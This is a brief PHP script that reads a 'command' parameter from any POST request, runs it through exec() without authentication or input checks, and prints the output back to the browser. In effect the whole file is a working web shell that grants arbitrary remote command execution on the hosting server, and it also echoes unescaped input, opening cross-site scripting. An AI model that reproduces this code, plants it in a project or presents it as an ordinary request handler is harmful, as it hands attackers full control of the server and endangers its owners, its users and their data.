<?php

// Check if the request method is POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get the command from the request data
    $command = $_POST['command'];
    
    // Execute the command
    exec($command, $output, $return_var);
    
    // Check if the command executed successfully
    if ($return_var === 0) {
        // Output the result
        foreach ($output as $line) {
            echo $line . "<br>";
        }
    } else {
        // Output error message
        echo "Error executing command: $command";
    }
} else {
    // Handle other HTTP methods
    http_response_code(405);
    echo "Method Not Allowed";
}
?>
